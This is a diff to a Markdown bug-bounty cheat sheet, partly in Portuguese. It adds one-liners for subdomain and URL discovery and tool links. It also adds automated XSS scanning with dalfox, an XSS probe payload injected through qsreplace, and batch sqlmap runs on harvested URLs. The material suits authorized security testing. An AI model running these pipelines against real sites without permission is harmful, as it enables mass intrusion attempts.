@@ -23,7 +23,21 @@
 
 ``` $ subfinder -d domain.com -silent | httpx -status | gau ```
 
-# URL Discovery 
+``` $ subfinder -d domain | httpx -csp-probe -title ```
+
+
+
+# Parameter/Content/URL Discovery
+
+- ParamSpider
+- gf
+- Parht
+- kxss
+- gxss
+  
+- httpx
+- aquatone
+- SecretFinder
 
 - gau
 - hakrawler
@@ -33,23 +47,27 @@
 
 ``` $ cat domains.txt | httpx -status | gau ```
 
-# Content Discovery
-
-- httpx
-- aquatone
-- SecretFinder
-
 ``` $ cat domains.txt | httpx -status -ports 80,443,8080 -path /admin ``` 
 
-``` $ subfinder -d domain.com -silent | aquatone ```  
+``` $ subfinder -d domain.com -silent | aquatone ``` 
 
-# Parameter discovery
+``` $ cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files ```
 
-- ParamSpider
-- gf
-- Parht
-- kxss
-- gxss
+``` $ arjun -u url ```
+
+https://github.com/s0md3v/Arjun
+
+``` $ echo domain | waybackurls | unfurl paths ```
+
+``` $ echo domain | waybackurls | unfurl keys ```
+
+``` $ echo domains | waybackurls | gf xss | hakcheckurl ```
+
+``` $ echo domains | subfinder -silent | httpx -silent | katana -silent -d 10 | unfurl keys | uro ```
+
+https://github.com/projectdiscovery/katana
+
+https://github.com/tomnomnom/unfurl
 
 
 #### _xargs_ (carrega lista para uma tool)
@@ -96,7 +114,18 @@
  https://github.com/hakluke/hakrawler
 
  ``` $ echo domain.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep -v 'Not' ``` 
- 
+
+
+ #### xss automation
+
+``` $ echo domains-with-params | gxss -p test | dalfox pipe --mining-dict-word arjun/params.txt --skip-bav -o file.txt ```
+
+``` $ echo domains | waybackurls | uro | gf xss | dalfox pipe --skip-bav ```
+
+https://github.com/hahwul/dalfox
+
+https://github.com/RenwaX23/XSSTRON
+
 
 ## SQLi
 
@@ -105,6 +134,8 @@
  https://github.com/Findomain/Findomain
 
  ``` $ findomain -t domain.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1 ```
+
+ ``` $ echo domains | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt ; sqlmap -m sqli.txt --batch --random-agent --level 1 ```
 
 ## OpenRedirect
 
@@ -119,6 +150,11 @@
 #### _cs.github_
  
  https://github.blog/2021-12-08-improving-github-code-search/
+
+#### Git dorker
+
+https://github.com/obheda12/GitDorker
+
 
 
 #### _git exposed_
@@ -151,6 +187,8 @@
  ``` $ cat tesla | httpx -status-code -mc 200 -content-type | grep 'application/json' ```
  
  ``` $ cat tesla | httpx -status-code -mc 200 | anew ```
+
+ ``` $ echo domains | waybakcurls| getJS ```
 
 
 #### send notifications to multiple places 
